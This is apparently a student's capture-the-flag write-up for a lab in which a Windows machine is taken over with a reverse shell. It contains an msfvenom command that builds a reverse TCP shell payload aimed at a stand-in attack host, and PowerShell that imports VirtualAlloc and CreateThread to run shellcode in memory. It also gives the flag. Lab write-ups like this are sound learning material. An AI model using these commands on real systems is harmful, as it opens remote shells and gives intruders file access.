# Shellcodes of the world, unite!

*Flag:* AOC{GOT _MY_ACCESS_B@CK007}

How you approached the challenge:

- step 1:So like they said first i entered this 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell
```
Then i used the netcat command to connect the reverse shell.

- step 2: After that if we replace the buf bytes with the script they gave and Then send the script to the reverse shell part by part we successfully get the reverse shell working. And after that we have access to machine and can write or get any files.

![62a7685ca6e7ce005d3f3afe-1732683410058](https://github.com/user-attachments/assets/c95c5b03-477a-483c-84d9-b54e1be45d39)


```
$VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@

Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
}
"@
Add-Type $CrtThread
```

- step 3: But looks like they changed stuff so we need to repeat the process again but this time the last section we need to enter line by line to gain access.and searchign this type C:\Users\glitch\Desktop\flag.txt
Should give the flag!

![62a7685ca6e7ce005d3f3afe-1732698537726](https://github.com/user-attachments/assets/f8651cf1-5ef3-4573-b101-2a4c220cfb00)


What you learned through solving this challenge:

1. Reverse shell

Other incorrect methods you tried:

- No incorrcet methods

References

- https://www.youtube.com/watch?v=ZBZhfu1A3Fw
